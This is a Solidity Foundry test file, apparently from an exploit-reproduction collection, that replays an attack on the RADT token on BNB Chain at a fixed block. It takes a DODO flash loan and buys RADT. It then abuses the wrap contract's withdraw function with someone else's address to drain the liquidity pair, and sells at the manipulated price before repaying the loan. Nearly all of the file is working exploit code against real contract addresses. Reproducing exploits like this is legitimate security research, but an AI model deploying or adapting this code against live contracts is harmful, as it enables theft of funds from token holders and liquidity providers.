pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface IWRAP {
    function withdraw(address from, address to, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;

    function _BASE_TOKEN_() external view returns (address);
}

contract ContractTest is Test {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    IWRAP wrap = IWRAP(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    address constant dodo = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 21_572_418);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        USDT.approve(address(Router), ~uint256(0));
        RADT.approve(address(Router), ~uint256(0));
        IDODO(dodo).flashLoan(0, 200_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        buyRADT();
        USDT.transfer(address(pair), 1);
        uint256 amount = RADT.balanceOf(address(pair)) * 100 / 9;
        wrap.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);
        pair.sync();
        sellRADT();
        USDT.transfer(address(dodo), 200_000 * 1e18);
    }

    function buyRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(RADT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function sellRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(RADT);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            RADT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
